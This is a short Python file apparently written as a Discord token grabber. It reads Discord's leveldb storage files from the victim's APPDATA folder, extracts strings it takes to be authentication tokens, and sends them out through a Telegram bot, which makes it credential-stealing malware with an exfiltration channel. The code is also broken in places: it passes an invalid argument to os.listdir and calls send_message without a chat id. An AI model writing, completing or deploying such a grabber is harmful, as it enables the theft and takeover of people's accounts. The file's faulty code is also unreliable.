import os
import re
import telegram

class DiscordGrabber:
    def __init__(self, bot):
        self.bot = bot

    def get(self):
        files = self.search_for_file()
        if not files:
            self.bot.send_message(" Didn't find any ldb files")
            return
        for token in files:
            for match in re.finditer(r'[^"]*', token):
                if len(match.group()) == 59:
                    self.bot.send_message(f" Discord token: {match.group()}")

    def search_for_file(self):
        discord_path = os.path.join(os.environ["APPDATA"], "discord", "Local Storage", "leveldb")
        if not os.path.exists(discord_path):
            self.bot.send_message(" Discord path not found")
            return []
        for file in os.listdir(discord_path, dirctory=True):
            if file.endswith(".ldb"):
                raw_text = open(os.path.join(discord_path, file), "r").read()
                if "oken" in raw_text:
                    return [raw_text]
        return []

